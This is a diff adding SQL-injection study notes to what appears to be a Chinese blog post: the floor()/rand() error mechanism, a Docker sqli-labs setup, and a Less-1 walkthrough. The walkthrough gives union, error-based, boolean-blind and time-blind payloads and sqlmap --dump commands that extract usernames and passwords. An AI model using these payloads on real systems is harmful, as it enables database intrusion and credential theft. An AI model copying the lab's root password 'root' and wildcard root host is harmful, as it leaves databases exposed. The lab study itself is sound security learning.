@@ -48,7 +48,29 @@ date: 2025-03-04 22:43:25
 
 ​	在**mysql5**版本以后，存在一个数据库为`information_schema`，在这个库里面，有三个重要的表：`columns`，`tables`，`SCHEMATA`表，在`SCHEMATA`表中的字段`SCHEMA_NAME`存放着数据库的信息。`tables`表中`TABLE_SCHEMA`和`TABLE_NAME`分别记录库名和表名。`columns`存储该用户创建的所有数据库的库名、表名和字段名。
 
+#### 1.1.1 Navicat连接Docker容器内MySQL
 
+> 有这个需求的原因是我太懒了，因为是用的docker开的sqli labs环境，又不想本地再配MySQL环境，因此干脆直接利用了。
+
+```bash
+$ docker run -dt --name sqli-labs -p 8888:80 -p 3307:3306 -e MYSQL_ROOT_PASSWORD=root acgpiano/sqli-labs:latest
+```
+
+这里需要给MySQL开一个端口映射，我这里给的是`3307`端口。
+
+```bash
+$ docker exec -it sqli-labs /bin/bash
+$ mysql
+```
+
+接下来将host修改为`%`即可。
+
+```sql
+select host,user from user where user='root';
+FLUSH PRIVILEGES;
+```
+
+<img src="sql注入/image-20250306000604769.png" alt="image-20250306000604769" style="zoom:50%;" />
 
 
 ### 1.2 判断是否存在注入
@@ -84,6 +106,71 @@ id="1"or"1"="1"
 按请求类型来分：**GET注入、POST注入、COOKIE注入。**
 
 按注入数据类型来分：**int型、string型、like型**
+
+
+
+#### 1.4.1 报错注入
+
+**XPATH报错注入**
+
+`updatexml（XML_document，XPath_string，new_value）`、`extractvalue（XML_document，xpath_string）`，XPATH的格式形如`/test`，如果XPATH出现格式错误，则会爆出XPATH语法错误。
+
+**floor()函数报错**
+
+```sql
+select count(*),concat('x',floor(rand(0)*2))x from information_schema.tables group by x
+```
+
+`rand(0)`的重复计算是固定的，会随机生成一个[0,1]的小数，`rand(0)*2`则生成[0,2]的数，`floor()`函数是向下取整，即最后结果为0或1。我们运行一下看看。
+
+```sql
+select floor(rand(0)*2) from information_schema.tables limit 0,8;
+```
+
+![image-20250306001213412](sql注入/image-20250306001213412.png)
+
+可以发现这里`floor(rand(0)*2)`的值是固定的。
+
+接下来说一下`group by`的原理，`group by`在执行时，会依次取出查询表中的记录创建一个临时表，`group by`的对象就是该临时表的主键，如果临时表中出现了该主键，则该值加一，若不存在则**插入**。再来看这个SQL语句。
+
+```sql
+select count(*),concat('x',floor(rand(0)*2))x from information_schema.tables group by x
+```
+
+其键必然为`x1`或者`x0`，那么应该只会值增加呀，为什么会报错呢？
+
+这里有个重要特性：当`group by`和`rand()`同时使用时，若该临时表中没有主键，则插入前`rand()`会再执行一次。
+
+那么我们来推断一下，第一次执行，`key`应该为`x0`，但是`x0`不存在，因此`rand(0)`又计算了一遍，最终第一次执行结果为`x1`。
+
+第二次执行，这时候`key`应该为`x1`，已存在，则值加一即可。
+
+第三次执行，这时候key应该为`x0`，不存在，`rand(0)`重新计算一遍，最终应该插入的`key`为`x1`，这里就出了问题了，它会直接插入，从而导致主键重复报错，这就是该报错原理。
+
+![image-20250306003105176](sql注入/image-20250306003105176.png)
+
+**优化方案**
+
+学习的[这篇文章](https://www.freebuf.com/articles/web/257881.html)，将`rand(0)`改为了`rand(14)`，运行一下看看。
+
+```sql
+mysql> select floor(rand(14)*2) from information_schema.tables limit 0,8;
++-------------------+
+| floor(rand(14)*2) |
++-------------------+
+|                 1 |
+|                 0 |
+|                 1 |
+|                 0 |
+|                 0 |
+|                 0 |
+|                 1 |
+|                 1 |
++-------------------+
+8 rows in set (0.00 sec)
+```
+
+这里只需要两条数据即可报错，但是如果只有一条数据`floor()`报错注入就不能用了，因为一条数据没办法重复。
 
 
 
@@ -410,6 +497,8 @@ and(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()
 
 ## 3. sqli-labs通关
 
+这里跟着[国光佬](https://www.sqlsec.com/2020/05/sqlilabs.html)学习
+
 ### 3.1 准备工作
 
 **sqli-labs环境搭建**
@@ -429,23 +518,79 @@ Error response from daemon: Head "https://registry-1.docker.io/v2/acgpiano/sqli-
 
 ![image-20250305014536324](sql注入/image-20250305014536324.png)
 
-查看相关版本细节。
+### 3.2 Less 1-20
+
+#### 3.2.1 Less-1
+
+```php
+$id=$_GET['id'];
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+
+if true
+  	"hahahaha"
+else 
+	print_r(mysql_error());  
+```
+
+**联合注入**
+
+手工
+
+```sql
+?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23 # 查库
+?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema="security")%23 # 查表
+?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name="users")%23 # 查字段
+?id=-1' union select 1,2,(select group_concat(username,password SEPARATOR 0x3c62723e) from users)%23 # 0x3c62723e=<br>，即按换行分割
+```
+
+sqlmap
 
 ```bash
-$ docker exec -it sqli-labs /bin/bash
-$ mysql -e "select version(),user()"
-+-------------------------+----------------+
-| version()               | user()         |
-+-------------------------+----------------+
-| 5.5.44-0ubuntu0.14.04.1 | root@localhost |
-+-------------------------+----------------+
-$ php --version
-PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)
-Copyright (c) 1997-2014 The PHP Group
-Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
-    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies
-$ cd /etc/init.d/ && apache2 -v
-Server version: Apache/2.4.7 (Ubuntu)
-Server built:   Oct 14 2015 14:20:21
+$ python sqlmap.py -u "http://localhost:8888/Less-1/?id=1" --technique=U -v 3 -D security -T users --dump --batch
+```
+
+**报错注入**
+
+手工
+
+```sql
+?id=1'and updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1)%23
+?id=1'and extractvalue(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23
+?id=1'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+```
+
+sqlmap
+
+```bash
+$ python sqlmap.py -u "http://localhost:8888/Less-1/?id=1" --technique=E -v 3 -D security -T users --dump --batch
+```
+
+**布尔盲注**
+
+手工
+
+```sql
+?id=1'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>67 %23 # 有回显
+?id=1'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68 %23 # 无回显
+```
+
+sqlmap
+
+```bash
+$ python sqlmap.py -u "http://localhost:8888/Less-1/?id=1" --technique=B -v 3 -D security -T users --dump --batch
+```
+
+**时间盲注**
+
+手工
+
+```sql
+?id=1'and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68,1,sleep(5)) %23
+```
+
+sqlmap
+
+```bash
+$ python sqlmap.py -u "http://localhost:8888/Less-1/?id=1" --technique=T -v 3 -D security -T users --dump --batch
 ```
 
